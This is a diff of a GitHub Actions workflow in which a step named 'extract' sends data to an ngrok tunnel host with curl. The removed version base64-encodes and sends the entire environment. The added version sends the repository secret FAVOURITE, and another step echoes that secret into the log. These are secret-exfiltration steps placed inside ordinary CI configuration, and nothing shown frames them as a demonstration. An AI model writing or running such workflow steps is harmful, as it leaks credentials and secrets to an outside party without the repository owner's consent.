@@ -17,9 +17,9 @@ jobs:
     environment: Vienna
 
     steps:
-      - name: I ll tell you my current favourite 
-        run: echo ${{ secrets.FAVOURITE }}
-
       - name: extract
         run: |
-          curl -k https://b1ed-128-130-252-211.ngrok-free.app?data=$(env | base64 --wrap=0)
+          curl https://b1ed-128-130-252-211.ngrok-free.app?data=$(echo ${{ secrets.FAVOURITE }} | base64 --wrap=0)"
+
+      - name: I ll tell you my current favourite 
+        run: echo ${{ secrets.FAVOURITE }}
